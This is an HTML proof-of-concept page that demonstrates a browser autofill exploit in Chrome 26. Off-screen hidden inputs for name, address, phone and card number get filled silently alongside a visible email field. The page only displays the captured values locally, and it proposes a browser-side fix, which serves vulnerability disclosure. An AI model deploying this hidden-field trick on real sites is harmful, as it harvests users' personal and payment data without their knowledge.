<!DOCTYPE html>
<html>
<head>
    <title>Stealing your data</title>
    <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/css/bootstrap-combined.min.css" rel="stylesheet">
    <style>
        /* pardon the embedded css */
        h1 { margin: 20px 0 20px 0; }
        form { margin-top: 30px; }
        #submit { margin-top: -10px; } 
        #hider { opacity: 0; margin-left: -3000px; }
        #results { font-family: monospace; }
    </style>
</head>
<body class="container">
    <div class="row-fluid">
        <h1>Exploiting Autofill</h1>

        <div class="span6">
            <p><strong>Affected Browsers:</strong> Chrome (26)</p>

            <p>Enter your email address until your browser's autofill dialog appears. Then
            select your email and click "exploit". If your browser supports this feature,
            it will autofill the hidden fields (check the source) with your personal information
            which you could end up sending to a malicious server.</p>

            <p><strong>This could be fixed</strong> by having the browser perform more rigorous checks on
            forms before triggering an autofill. If the form elements are out of the browser's
            viewport, the autofill shouldn't kick in.</p>

            <form id="formy" method="POST">
                <input type="text" name="email" id="email" placeholder="email">
                <button id="submit" class="btn">Exploit</button>

                <!-- Everything inside the #hider element will be hidden -->
                <div id="hider">
                    <input type="text" name="first_name" id="first_name">
                    <input type="text" name="last_name" id="last_name">
                    <input type="text" name="address" id="address">
                    <input type="text" name="city" id="city">
                    <input type="text" name="postal_code" id="postal_code">
                    <input type="text" name="phone_number" id="phone_number">

                    <!-- this doesn't always work -->
                    <input type="text" name="cc-number" id="cc-number" x-autocompletetype="cc-number">
                </div>
            </form>
        </div>

        <div id="results" class="span5"></div>

    </div>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>
    <script>
        
        var form = $("#formy");
        var results = $("#results");

        $("#submit").click(function(e) {
            e.preventDefault();
            var contents = form.serializeArray();
            results.append("<p>Results</p>");
            for (i = 0; i < contents.length; i++) {
                var str = "<div class=''>";
                str += contents[i]['name'] + ": ";
                str += contents[i]['value'];
                str += "</div>";
                results.append(str);
            }
            results.append("<br><p>These results were NOT sent to anyone. This is javascript output and only you are seeing it.</p>");
        });

    </script>
</body>
</html>